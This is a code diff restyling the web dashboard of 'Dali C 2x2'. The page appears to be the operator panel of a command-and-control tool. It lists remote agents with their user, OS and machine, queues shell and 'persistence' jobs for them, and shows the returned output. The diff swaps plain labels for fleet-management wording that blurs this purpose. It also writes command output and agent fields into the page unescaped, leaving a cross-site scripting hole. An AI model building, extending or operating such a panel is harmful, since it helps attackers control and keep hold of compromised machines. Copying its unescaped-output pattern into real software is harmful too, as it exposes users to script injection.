@@ -3,12 +3,12 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Dali C 2x2 | Manager Dashboard</title>
-    <link rel="stylesheet" href="/static/style.css?v=1.2" />
+    <title>Dali C 2x2 | Premium Dashboard</title>
+    <link rel="stylesheet" href="/static/style.css?v=1.3" />
     <link rel="preconnect" href="https://fonts.googleapis.com" />
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
     <link
-      href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&family=JetBrains+Mono&display=swap"
+      href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;600;800&family=JetBrains+Mono&display=swap"
       rel="stylesheet"
     />
   </head>
@@ -18,12 +18,12 @@
       <div class="sidebar">
         <div class="logo">
           <svg
-            width="24"
-            height="24"
+            width="28"
+            height="28"
             viewBox="0 0 24 24"
             fill="none"
             stroke="currentColor"
-            stroke-width="2"
+            stroke-width="2.5"
             stroke-linecap="round"
             stroke-linejoin="round"
           >
@@ -32,10 +32,22 @@
             <path d="M12 12V22" />
             <path d="M12 12L21.3 7.3" />
           </svg>
-          Dali C 2x2
+          Dali <span>C 2x2</span>
+        </div>
+        <div
+          style="
+            font-size: 0.7rem;
+            color: var(--text-muted);
+            margin-bottom: 1rem;
+            text-transform: uppercase;
+            letter-spacing: 0.1em;
+            font-weight: 700;
+          "
+        >
+          Inventory Nodes
         </div>
         <div id="agent-list">
-          <p style="color: var(--text-muted)">Discovering nodes...</p>
+          <p style="color: var(--text-muted)">Scanning fleet...</p>
         </div>
       </div>
 
@@ -44,7 +56,7 @@
         <!-- Stats Bar -->
         <div class="stats-container">
           <div class="stat-card">
-            <span class="stat-label">Online Nodes</span>
+            <span class="stat-label">Active Fleet</span>
             <span class="stat-value" id="stat-online">0</span>
           </div>
           <div class="stat-card">
@@ -52,45 +64,51 @@
             <span class="stat-value" id="stat-tasks">0</span>
           </div>
           <div class="stat-card">
-            <span class="stat-label">Queued</span>
+            <span class="stat-label">Queue Load</span>
             <span class="stat-value" id="stat-pending">0</span>
           </div>
           <div class="stat-card">
-            <span class="stat-label">Orchestration</span>
-            <div style="display: flex; gap: 5px">
+            <span class="stat-label">Control Plane</span>
+            <div style="display: flex; gap: 8px; margin-top: 10px">
               <button
-                id="export-btn"
-                style="padding: 2px 8px; font-size: 0.6rem; margin-top: 5px"
+                style="padding: 6px 12px; font-size: 0.65rem"
                 onclick="exportAudit()"
               >
-                Export Audit CSV
+                Export Audit
               </button>
               <a
                 href="/docs"
                 target="_blank"
                 style="
-                  padding: 2px 8px;
-                  font-size: 0.6rem;
-                  margin-top: 5px;
-                  background: var(--bg-dark);
-                  color: var(--accent);
-                  border: 1px solid var(--accent);
-                  border-radius: 0.5rem;
+                  padding: 6px 12px;
+                  font-size: 0.65rem;
+                  background: rgba(255, 255, 255, 0.05);
+                  color: var(--text-main);
+                  border-radius: 1rem;
                   text-decoration: none;
+                  border: 1px solid rgba(255, 255, 255, 0.1);
+                  font-weight: 700;
                   display: flex;
                   align-items: center;
                 "
-                >API Docs</a
+                >API</a
               >
             </div>
           </div>
         </div>
 
         <div id="welcome-screen" class="glass-card">
-          <h1>Fleet Control Plane</h1>
-          <p style="color: var(--text-muted)">
-            Select a managed node from the inventory to orchestrate jobs and
-            view telemetry.
+          <h1>Dali Orchestrator</h1>
+          <p
+            style="
+              color: var(--text-muted);
+              font-size: 1.1rem;
+              max-width: 600px;
+            "
+          >
+            The central nervous system for your fleet. Select a managed node to
+            begin high-concurrency job orchestration and sensor telemetry
+            analysis.
           </p>
         </div>
 
@@ -100,46 +118,78 @@
             style="
               display: flex;
               justify-content: space-between;
-              align-items: center;
+              align-items: flex-start;
+              margin-bottom: 1.5rem;
             "
           >
-            <h2 id="active-agent-title">Node Control</h2>
-            <div id="node-badge"></div>
+            <div>
+              <h2
+                id="active-agent-title"
+                style="font-size: 1.75rem; margin-bottom: 0.25rem"
+              >
+                Node ID
+              </h2>
+              <div id="node-tags" style="display: flex; gap: 10px"></div>
+            </div>
+            <div style="display: flex; gap: 10px">
+              <button class="btn-danger" onclick="deleteCurrentNode()">
+                Terminate Node
+              </button>
+            </div>
           </div>
 
           <div class="task-controls">
             <select id="task-type">
-              <option value="sysinfo">Get System Telemetry</option>
-              <option value="shell">Queue Shell Command</option>
-              <option value="persist">Establish Persistence</option>
+              <option value="sysinfo">Telemetry Analysis</option>
+              <option value="shell">Shell Orchestration</option>
+              <option value="persist">Persistence Vector</option>
             </select>
             <input
               type="text"
               id="task-command"
-              placeholder="Enter payload configuration..."
+              placeholder="Enter configuration payload..."
               style="flex-grow: 1"
             />
-            <button onclick="sendTask()">Submit Job</button>
+            <button onclick="sendTask()">Execute Job</button>
           </div>
         </div>
 
-        <!-- Job History Table -->
+        <!-- Job History -->
         <div id="terminal-container" style="display: none">
           <div class="glass-card">
-            <h2>Job Orchestration History</h2>
+            <h2
+              style="
+                margin-bottom: 2rem;
+                display: flex;
+                align-items: center;
+                gap: 10px;
+              "
+            >
+              <svg
+                width="20"
+                height="20"
+                viewBox="0 0 24 24"
+                fill="none"
+                stroke="currentColor"
+                stroke-width="2"
+                stroke-linecap="round"
+                stroke-linejoin="round"
+              >
+                <polyline points="22 12 18 12 15 21 9 3 6 12 2 12"></polyline>
+              </svg>
+              Orchestration Log
+            </h2>
             <table class="job-table">
               <thead>
                 <tr>
-                  <th>Job ID</th>
-                  <th>Type</th>
-                  <th>Scheduled</th>
+                  <th>Ref</th>
+                  <th>Vector</th>
+                  <th>Timestamp</th>
                   <th>Status</th>
-                  <th>Execution Result</th>
+                  <th>Outcome</th>
                 </tr>
               </thead>
-              <tbody id="task-history">
-                <!-- Tasks will be injected here -->
-              </tbody>
+              <tbody id="task-history"></tbody>
             </table>
           </div>
         </div>
@@ -150,21 +200,27 @@
       let activeAgentId = null;
       const accessToken = localStorage.getItem("access_token");
 
-      // Check if logged in
       if (!accessToken) {
         window.location.href = "/login";
       }
 
+      async function apiFetch(url, options = {}) {
+        options.headers = {
+          ...options.headers,
+          Authorization: `Bearer ${accessToken}`,
+        };
+        const response = await fetch(url, options);
+        if (response.status === 401) {
+          localStorage.removeItem("access_token");
+          window.location.href = "/login";
+        }
+        return response;
+      }
+
       async function fetchStats() {
         try {
-          const response = await fetch("/api/stats", {
-            headers: { Authorization: `Bearer ${accessToken}` },
-          });
-          if (response.status === 401) {
-            localStorage.removeItem("access_token");
-            window.location.href = "/login";
-          }
-          const stats = await response.json();
+          const res = await apiFetch("/api/stats");
+          const stats = await res.json();
           document.getElementById("stat-online").innerText =
             stats.online_agents;
           document.getElementById("stat-tasks").innerText = stats.total_tasks;
@@ -175,10 +231,8 @@
 
       async function fetchAgents() {
         try {
-          const response = await fetch("/api/agents", {
-            headers: { Authorization: `Bearer ${accessToken}` },
-          });
-          const agents = await response.json();
+          const res = await apiFetch("/api/agents");
+          const agents = await res.json();
           const list = document.getElementById("agent-list");
           list.innerHTML = "";
 
@@ -187,92 +241,118 @@
             div.className = `agent-item ${
               agent.id === activeAgentId ? "active" : ""
             }`;
-            div.onclick = () => selectAgent(agent.id, agent.status);
-
+            div.onclick = () => selectAgent(agent);
             const isOnline = agent.status === "online";
-            const os = agent.info?.os || "Unknown";
-
             div.innerHTML = `
-                        <div class="agent-id">${agent.id.substring(0, 8)} [v${
-              agent.version
-            }]</div>
-                        <div class="agent-status">
-                            <span class="status-dot ${
-                              isOnline ? "status-online" : "status-offline"
-                            }"></span>
-                            <span>${agent.status.toUpperCase()}</span>
-                        </div>
-                        <div class="agent-meta">
-                            <span>OS: ${os}</span>
-                            <span>Seen: ${new Date(
-                              agent.last_seen
-                            ).toLocaleTimeString()}</span>
-                        </div>
-                    `;
+                <div class="agent-id">Node::${agent.id.substring(0, 8)}</div>
+                <div class="agent-status" style="color: ${
+                  isOnline ? "var(--success)" : "var(--text-muted)"
+                }">
+                    <span class="status-dot ${
+                      isOnline ? "status-online" : "status-offline"
+                    }"></span>
+                    ${agent.status.toUpperCase()}
+                </div>
+                <div class="agent-meta">
+                    <span>OS: ${agent.info?.os || "---"}</span>
+                    <span>v${agent.version}</span>
+                </div>
+            `;
             list.appendChild(div);
           });
         } catch (e) {}
       }
 
-      async function selectAgent(id, status) {
-        activeAgentId = id;
+      function selectAgent(agent) {
+        activeAgentId = agent.id;
         document.getElementById("welcome-screen").style.display = "none";
         document.getElementById("agent-controls").style.display = "block";
         document.getElementById("terminal-container").style.display = "block";
         document.getElementById(
           "active-agent-title"
-        ).innerText = `Node: ${id.substring(0, 8)}`;
+        ).innerText = `Managed Node [${agent.id.substring(0, 8)}]`;
+
+        const tags = document.getElementById("node-tags");
+        tags.innerHTML = `
+            <span class="badge" style="background: rgba(255,255,255,0.05)">${
+              agent.info?.user || "Unknown"
+            }</span>
+            <span class="badge" style="background: rgba(56,189,248,0.1); color: var(--accent)">${
+              agent.info?.os || "OS"
+            } ${agent.info?.machine || ""}</span>
+        `;
 
         fetchAgents();
         fetchHistory();
       }
 
+      async function deleteCurrentNode() {
+        if (!activeAgentId) return;
+        if (
+          !confirm(
+            `Are you sure you want to terminate Node ${activeAgentId.substring(
+              0,
+              8
+            )}? This will remove all associated logs.`
+          )
+        )
+          return;
+
+        try {
+          const res = await apiFetch(`/api/agents/${activeAgentId}`, {
+            method: "DELETE",
+          });
+          if (res.ok) {
+            activeAgentId = null;
+            document.getElementById("agent-controls").style.display = "none";
+            document.getElementById("terminal-container").style.display =
+              "none";
+            document.getElementById("welcome-screen").style.display = "flex";
+            fetchAgents();
+            fetchStats();
+          }
+        } catch (e) {
+          alert("Termination failed");
+        }
+      }
+
       async function fetchHistory() {
         if (!activeAgentId) return;
         try {
-          const response = await fetch(`/api/tasks/${activeAgentId}`, {
-            headers: { Authorization: `Bearer ${accessToken}` },
-          });
-          const tasks = await response.json();
+          const res = await apiFetch(`/api/tasks/${activeAgentId}`);
+          const tasks = await res.json();
           const container = document.getElementById("task-history");
           container.innerHTML = "";
 
           tasks.forEach((task) => {
             const row = document.createElement("tr");
-
-            let resultHtml =
-              '<span style="color: var(--text-muted); font-style: italic;">Queued for orchestration...</span>';
-            if (task.status === "leased") {
-              resultHtml =
-                '<span style="color: var(--accent); font-weight: 600;">Node has leased the job...</span>';
-            } else if (task.status === "failed") {
-              resultHtml = `<div class="result-block" style="border-color: var(--danger); color: var(--danger)">${
-                task.result?.error || "Unknown Error"
+            let outcome = `<i style="color: var(--text-muted)">Awaiting execution...</i>`;
+            if (task.status === "leased")
+              outcome = `<span style="color: var(--accent)">Node processing...</span>`;
+            else if (task.status === "failed")
+              outcome = `<div class="result-block" style="border-color: var(--danger)">${
+                task.result?.error || "Execution Error"
               }</div>`;
-            } else if (task.result) {
+            else if (task.result) {
               const out =
                 task.result.stdout ||
                 JSON.stringify(task.result.info || task.result, null, 2);
-              resultHtml = `<div class="result-block">${out}</div>`;
+              outcome = `<div class="result-block">${out}</div>`;
             }
 
-            const scheduledTime = new Date(task.created_at).toLocaleTimeString(
-              [],
-              { hour: "2-digit", minute: "2-digit", second: "2-digit" }
-            );
-            const jobType = task.type.toUpperCase();
-
             row.innerHTML = `
-                <td><code style="color: var(--accent)">${task.id.substring(
+                <td><code style="color: var(--accent)">#${task.id.substring(
                   0,
-                  8
+                  4
                 )}</code></td>
-                <td><span style="font-size: 0.7rem; font-weight: 800; opacity: 0.8;">${jobType}</span></td>
-                <td style="font-size: 0.75rem; color: var(--text-muted)">${scheduledTime}</td>
+                <td><b style="font-size: 0.75rem">${task.type.toUpperCase()}</b></td>
+                <td style="font-size: 0.75rem; color: var(--text-muted)">${new Date(
+                  task.created_at
+                ).toLocaleTimeString()}</td>
                 <td><span class="badge badge-${task.status}">${
               task.status
             }</span></td>
-                <td>${resultHtml}</td>
+                <td>${outcome}</td>
             `;
             container.appendChild(row);
           });
@@ -283,34 +363,28 @@
         const type = document.getElementById("task-type").value;
         const command = document.getElementById("task-command").value;
         if (!activeAgentId) return;
-
         try {
-          await fetch(
+          await apiFetch(
             `/operator/tasks?agent_id=${activeAgentId}&task_type=${type}&command=${encodeURIComponent(
               command
             )}`,
-            {
-              method: "POST",
-              headers: { Authorization: `Bearer ${accessToken}` },
-            }
+            { method: "POST" }
           );
           document.getElementById("task-command").value = "";
           fetchHistory();
         } catch (e) {
-          alert("Orchestration request failed");
+          alert("Execution failed");
         }
       }
 
       async function exportAudit() {
         try {
-          const response = await fetch("/api/tasks/export", {
-            headers: { Authorization: `Bearer ${accessToken}` },
-          });
-          const blob = await response.blob();
+          const res = await apiFetch("/api/tasks/export");
+          const blob = await res.blob();
           const url = window.URL.createObjectURL(blob);
           const a = document.createElement("a");
           a.href = url;
-          a.download = "task_history_audit.csv";
+          a.download = "fleet_audit_log.csv";
           document.body.appendChild(a);
           a.click();
           a.remove();
@@ -319,35 +393,32 @@
         }
       }
 
-      // WebSocket for live updates
       function connectWebSocket() {
         const protocol = window.location.protocol === "https:" ? "wss:" : "ws:";
         const ws = new WebSocket(`${protocol}//${window.location.host}/ws`);
-
-        ws.onmessage = function (event) {
+        ws.onmessage = (event) => {
           const data = JSON.parse(event.data);
-          console.log("WS Event:", data);
-
-          // Refresh relevant parts of the UI
           fetchAgents();
           fetchStats();
           if (
             activeAgentId &&
-            (data.agent_id === activeAgentId || !data.agent_id)
+            (data.agent_id === activeAgentId || data.event === "agent_deleted")
           ) {
-            fetchHistory();
+            if (
+              data.event === "agent_deleted" &&
+              data.agent_id === activeAgentId
+            ) {
+              activeAgentId = null;
+              location.reload();
+            } else {
+              fetchHistory();
+            }
           }
         };
-
-        ws.onclose = function () {
-          console.log("WS Disconnected. Retrying in 5s...");
-          setTimeout(connectWebSocket, 5000);
-        };
+        ws.onclose = () => setTimeout(connectWebSocket, 5000);
       }
 
       connectWebSocket();
-
-      // Initial fetch
       fetchAgents();
       fetchStats();
     </script>
